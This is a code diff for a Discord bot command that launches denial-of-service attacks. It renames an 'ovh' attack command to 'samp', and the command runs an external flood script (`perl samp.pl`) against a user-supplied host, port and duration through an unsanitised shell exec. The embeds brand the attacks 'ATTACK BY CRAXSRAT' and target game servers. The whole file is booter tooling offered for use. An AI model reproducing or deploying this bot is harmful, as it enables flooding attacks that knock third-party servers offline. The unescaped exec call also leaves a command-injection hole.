@@ -16,16 +16,16 @@ if (message.channel.id != room) {
 if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('ATTACK BY EL CRAXSRAT')
-	.setDescription("`example .ovh 1.1.1.1 22 90`")
-	.setFooter("pls don't attack .gov .edu")
+	.setTitle('SAMP')
+	.setDescription("`example .samp 1.1.1.1 7777 60`")
+	.setFooter("not all server samp down!")
 	message.channel.send(embed1);
 	return;
 	}
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node ovh.js ${host} ${port} 65500 ${duration} 800`, (error, stdout, stderr) => {
+exec(`perl samp.pl ${host} ${port} ${duration}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -34,10 +34,10 @@ setTimeout(function(){
 
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('🚀 **ATTACK BY CRAXSRAT** 🚀')
+	.setTitle('🚀 **SAMP ATTACK BY craxsrat** 🚀')
 	.setTimestamp()
-  .setDescription("**Host** : `" + host + "` \n **Port** : `" + port + "` \n **Methods** : `OVH 💣` \n **Time** : `" + duration + "`")
-	.setFooter('© Developer: ROMEO', client.user.avatarURL)
+  .setDescription("**Host** : `" + host + "` \n **Port** : `" + port + "` \n **Methods** : `SAMP 💣` \n **Time** : `" + duration + "`")
+	.setFooter('© Developer: ', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(attackgif)
 	.setThumbnail("")
@@ -45,7 +45,7 @@ const embed = new Discord.MessageEmbed()
  }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds
 
 // Attack Gif
-var gifler = ["https://media.giphy.com/media/l4KhQo2MESJkc6QbS/giphy.gif", "https://media.giphy.com/media/jzHFPlw89eTqU/giphy.gif"];
+var gifler = ["https://media.giphy.com/media/l4KhQo2MESJkc6QbS/giphy.gif", "https://media.giphy.com/media/jzHFPlw89eTqU/giphy.gif,"];
     var attackgif = gifler[Math.floor((Math.random() * gifler.length))];
 
 // Verify Gif
@@ -56,10 +56,10 @@ var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
 console.log('Start Verify ID Discord:' +  message.guild.id)
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('🚀 **ATTACK BY CRAXSRAT** 🚀')
+	.setTitle('🚀 **SAMP** 🚀')
 	.setTimestamp()
-	.setDescription("**► Attack Loading **")
-	.setFooter('© Developer: ZINOU', client.user.avatarURL)
+	.setDescription("**► Attack loading **")
+	.setFooter('© Developer: ', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(loadinggif)
 	.setThumbnail("")
@@ -70,12 +70,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['ovh'],
+  aliases: ['samp'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'ovh',
-  description: 'VenThings#3280',
-  usage: 'ovh'
+  name: 'samp',
+  description: 'VenThing#3280',
+  usage: 'samp'
 }
